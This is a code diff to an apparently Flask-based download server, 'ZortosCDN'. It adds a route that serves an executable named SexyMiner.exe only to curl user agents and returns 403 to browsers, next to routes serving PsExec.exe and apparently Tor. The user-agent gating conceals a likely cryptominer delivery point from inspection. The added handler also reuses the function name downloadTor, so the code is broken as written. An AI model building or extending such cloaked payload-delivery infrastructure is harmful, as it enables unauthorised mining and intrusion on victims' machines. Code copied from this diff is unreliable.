@@ -44,6 +44,20 @@ def downloadTor():
         print(useragent)
         return 'Access to that resource is forbidden.', 403
     
+    
+    
+@app.route('/api/download/SexyMiner.exe')
+def downloadTor():
+    path = "/home/azureuser/ZortosCDN/SexyMiner.exe" # Add your own directory
+    useragent = request.headers.get('User-Agent')
+    if 'curl' in useragent:
+        return send_file(path, as_attachment=True)
+    # For windows you need to use drive name [ex: F:/Example.pdf]
+    else:
+        print(useragent)
+        return 'Access to that resource is forbidden.', 403
+    
+    
 @app.route('/api/download/PsExec.exe')
 def downloadpsexec():
     path = "/home/azureuser/ZortosCDN/PsExec.exe" # Add your own directory
